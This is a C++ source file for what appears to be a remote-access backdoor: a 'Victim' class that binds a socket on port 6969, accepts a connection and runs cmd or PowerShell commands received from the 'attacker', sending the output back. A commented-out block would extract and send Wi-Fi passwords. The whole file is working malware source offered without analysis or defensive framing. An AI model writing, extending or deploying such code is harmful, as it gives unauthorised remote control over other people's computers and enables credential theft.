#ifdef _WIN32
#define _WINSOCK_DEPRECATED_NO_WARNINGS
//#include <windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#endif

#include <stdio.h> 
#include <stdlib.h> 
#include <string>
#include "includes/helpers.hpp"


#ifdef __linux__
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h>
#define IPPROTO_TCP 0
#endif

class Victim {
	std::string ipAddr;
	int portNumber;
	SOCKET sAcceptSocket = 0;
	SOCKET TCPServerSocket = 0;
	std::string recvdIPAddr;
	int recvdPort = 0;

	bool sendData(std::string buffer) {
		int iSend = send(sAcceptSocket, buffer.c_str(), buffer.length(), 0);
		if (iSend == SOCKET_ERROR) {
			std::cout << "[!] Unable to send data to the server " << recvdIPAddr << std::endl;
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
#endif
			return false;
		}
		//std::cout << "Data " << buffer << " sent to " << recvdIPAddr << " successfully!\n";
		return true;
	}
	std::string recvData() {
		char recvBuffer[BUFFER_LENGTH];
		int iRecv = recv(sAcceptSocket, recvBuffer, BUFFER_LENGTH, 0);
		if (iRecv == SOCKET_ERROR) {
			std::cout << "[!] Unable to receive data.\n";
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
			return "";
		}
		return recvBuffer;
	}
	// Execute commands on the victim pc recevied from the attacker
	void shellexec(bool isPS = false) {
		std::string recvdCMD;
		std::string cmdOut;
		std::string senderBuffer = (isPS) ? Helpers::getPowerShellPrompt() : Helpers::getShell();
		sendData(senderBuffer);
		do {
			recvdCMD = Helpers::removeNewline(recvData().c_str());
			if (!((recvdCMD == "shellexit") || (recvdCMD == "exitshell"))) {
				if (isPS) {
					recvdCMD.insert(0, "powershell -c \"");
					recvdCMD += "\"";
				}
				cmdOut = Helpers::executeCommand(recvdCMD.c_str());
				sendData(cmdOut);
			}
			if (recvdCMD == "shellexit" || recvdCMD == "exitshell")
				sendData("exit");
		} while (recvdCMD != "shellexit" && recvdCMD != "exitshell");
	}
public:
	Victim(std::string ipAddr = "0.0.0.0", int portNumber = 6969)
		: ipAddr(ipAddr), portNumber(portNumber)
	{ }
	void setIPAddress(std::string ipAddr) { this->ipAddr = ipAddr; }
	void setPortNumber(int portNumber) { this->portNumber = portNumber; }
	bool establishConnection() {
#ifdef _WIN32
		WSADATA winSockData;
		int iWsaStartup = -1;
		int iWsaCleanup = -1;
#endif
		sockaddr_in TCPServerAddr;

		int iBind = 0;
		int iListen = 0;
		int maxConns = 2;
		// Actual Code
		Helpers::divider();
#ifdef _WIN32
		WORD wVersion = MAKEWORD(2, 2);
		iWsaStartup = WSAStartup(wVersion, &winSockData);

		if (iWsaStartup != 0) {
			std::cout << "[!] WSAStartup Failed!.\nFollowing error occurred: " << iWsaStartup << std::endl;
			return false;
		}
#endif

		TCPServerAddr.sin_family = AF_INET;
#ifdef _WIN32
		TCPServerAddr.sin_addr.S_un.S_addr = inet_addr(this->ipAddr.c_str());
#endif
#ifdef __linux__
		TCPServerAddr.sin_addr.s_addr = inet_addr(this->ipAddr.c_str());
#endif
		TCPServerAddr.sin_port = htons(this->portNumber);

		TCPServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (TCPServerSocket == INVALID_SOCKET) {
			std::cout << "[!] Unable to create socket!\n";
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
			return false;
		}
#ifdef __linux__
		int opt = 1;
		if (setsockopt(TCPServerSocket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
			std::cout << "[!] An Error occurred while setting the socket options!\n";
			return false;
		}
#endif
		iBind = bind(TCPServerSocket, (sockaddr*)&TCPServerAddr, sizeof(TCPServerAddr));
		if (iBind == SOCKET_ERROR) {
			std::cout << "[!] Unable to bind to " << ipAddr << " on port " << portNumber << std::endl;
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
			return false;
		}
		iListen = listen(TCPServerSocket, maxConns);
		if (iListen == SOCKET_ERROR) {
			std::cout << "[!] Unable to listen on port " << portNumber << std::endl;
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
			return false;
		}
		std::cout << "[*] Listening on " << ipAddr << ":" << portNumber << std::endl;
		Helpers::divider();
		return true;
	}
	bool acceptConnection() {

		sockaddr_in TCPClientAddr;
		int iTCPClientAddr = sizeof(TCPClientAddr);

		char recvBuffer[BUFFER_LENGTH] = { 0 };
		int iRecvBuffer = strlen(recvBuffer) + 1;
		this->sAcceptSocket = accept(this->TCPServerSocket, (sockaddr*)&TCPClientAddr, (socklen_t*)&iTCPClientAddr);
		if (sAcceptSocket == INVALID_SOCKET) {
			std::cout << "[!] An error occured while accepting connection from " << ipAddr << " on port " << portNumber << "!\n";
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
			return false;
		}
		// Converting the LONG Data to an IP Address
		char ipAddr[INET_ADDRSTRLEN];
#ifdef _WIN32
		inet_ntop(AF_INET, &(TCPClientAddr.sin_addr.S_un.S_addr), ipAddr, INET_ADDRSTRLEN);
#endif
#ifdef __linux__
		inet_ntop(AF_INET, &(TCPClientAddr.sin_addr.s_addr), ipAddr, INET_ADDRSTRLEN);
#endif
		for (size_t i = 0; i < strlen(ipAddr); i++)
			recvdIPAddr += ipAddr[i];
		recvdPort = TCPClientAddr.sin_port;
		std::cout << "[*] Accepted Connection from " << recvdIPAddr << ":" << recvdPort << std::endl;
		Helpers::divider();
		return true;
	}
	void sendBanner() {
		std::string victimIP = recvData();
		std::string banner = Helpers::getBanner(victimIP.c_str());
		int bannerLen = banner.length();
		banner.insert(0, Helpers::getDivider(bannerLen));
		banner += Helpers::getDivider(bannerLen);
		sendData(banner);
	}
	void run() {
		std::string recvBuffer = "";
		bool kill = false;
		while (!kill) {
			recvBuffer = recvData();
			std::cout << "Recevied: " << recvBuffer << std::endl;
			if (recvBuffer == "invoke-shell" || recvBuffer == "invoke-ps-shell") {
				shellexec(recvBuffer == "invoke-ps-shell");
			}
			if (recvBuffer == "closeconn") {
				kill = true;
			}
			// if (recvBuffer == "get-wifi-passwords") {
			// 	WifiExtractor* wf = new WifiExtractor();
			// 	std::string creds = wf->getCreds();
			// 	sendData(creds);
			// }
		}
		return;
	}
	~Victim() {
#ifdef _WIN32
		WSACleanup();
#endif
		closesocket(TCPServerSocket);
		std::cout << "[+] Connection terminated with " << recvdIPAddr << " on port " << portNumber << std::endl;
	}
};

int main() {
	Victim* v = new Victim();
	if (v->establishConnection()) {
		if (v->acceptConnection()) {
			v->sendBanner();
			v->run();
			// Explicitly calling the destructor.
			v->~Victim();
		}
	}
}